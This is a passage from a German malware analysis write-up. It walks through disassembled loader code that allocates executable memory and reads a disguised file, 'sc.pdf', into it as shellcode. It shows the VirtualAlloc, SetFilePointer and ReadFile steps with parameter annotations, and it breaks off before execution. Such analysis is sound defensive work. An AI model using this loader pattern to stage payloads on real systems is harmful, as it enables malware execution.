  SIZE_T dwSize,                // = Dateigröße (GetFileSize Ergebnis)
  DWORD  flAllocationType,      // = 0x1000 → MEM_COMMIT
  DWORD  flProtect              // = 0x40   → PAGE_EXECUTE_READWRITE
);
```

Die Malware reserviert damit einen ausführbaren Speicherbereich im Prozess mit derselben Größe wie die gelesene Datei `sc.pdf`. Dies deutet klar auf eine Vorbereitung zur späteren Ausführung eines Payloads hin.

## 7. Zurücksetzen des Dateizeigers mit SetFilePointer

Unmittelbar nach der Speicherreservierung folgt dieser Code:

```
00401123 | 8945 F8                  | mov dword ptr ss:[ebp-8],eax
00401126 | 6A 00                    | push 0
00401128 | 6A 00                    | push 0
0040112A | 6A 00                    | push 0
0040112C | 8B4D E4                  | mov ecx,dword ptr ss:[ebp-1C]
0040112F | 51                       | push ecx
00401130 | 8B55 FC                  | mov edx,dword ptr ss:[ebp-4]
00401133 | FF52 30                  | call dword ptr ds:[edx+30]  ; SetFilePointer
```

Dies entspricht einem indirekten Aufruf der Windows-API `SetFilePointer` mit den folgenden Parametern:

```c
DWORD SetFilePointer(
  HANDLE hFile,                // [ebp-1C]
  LONG   lDistanceToMove,      // 0
  PLONG  lpDistanceToMoveHigh, // NULL
  DWORD  dwMoveMethod          // FILE_BEGIN (0)
);
```

Der Funktionsaufruf setzt den Dateizeiger wieder auf den Anfang der Datei. Dies ist notwendig, um im nächsten Schritt die Datei (`sc.pdf`) erneut vollständig zu lesen, diesmal nicht zur Größenbestimmung, sondern zur tatsächlichen Speicherung im vorher allokierten Speicherbereich.

## 8. Dateiinhalt mit ReadFile in Speicher kopieren

Direkt im Anschluss wird der folgende Code ausgeführt:

```
00401136 | 6A 00              | push 0
00401138 | 8D45 E8            | lea eax,dword ptr ss:[ebp-18]
0040113B | 50                 | push eax
0040113C | 8B4D F4            | mov ecx,dword ptr ss:[ebp-C]
0040113F | 51                 | push ecx
00401140 | 8B55 F8            | mov edx,dword ptr ss:[ebp-8]
00401143 | 52                 | push edx
00401144 | 8B45 E4            | mov eax,dword ptr ss:[ebp-1C]
00401147 | 50                 | push eax
00401148 | 8B4D FC            | mov ecx,dword ptr ss:[ebp-4]
0040114B | FF51 2C            | call dword ptr ds:[ecx+2C]  ; ReadFile
```

Dies entspricht einem indirekten Aufruf der Windows-API `ReadFile` mit den folgenden Parametern:

```c
BOOL ReadFile(
  HANDLE       hFile,                  // = [ebp-1C]
  LPVOID       lpBuffer,               // = [ebp-8] (Zielpuffer → VirtualAlloc)
  DWORD        nNumberOfBytesToRead,   // = [ebp-C] (Dateigröße)
  LPDWORD      lpNumberOfBytesRead,    // = [ebp-18] (Variable zur Speicherung)
  LPOVERLAPPED lpOverlapped            // = NULL
);
```

Dieser Aufruf liest den gesamten Inhalt der Datei `sc.pdf` und speichert ihn in der zuvor allokierten, ausführbaren Speicherregion.

Dies ist ein klassischer Schritt beim Laden eines Payloads oder Shellcodes, um:

- den Code aus einer Datei in den Speicher zu bringen,
- ihn dort bereit zur Ausführung zu halten,
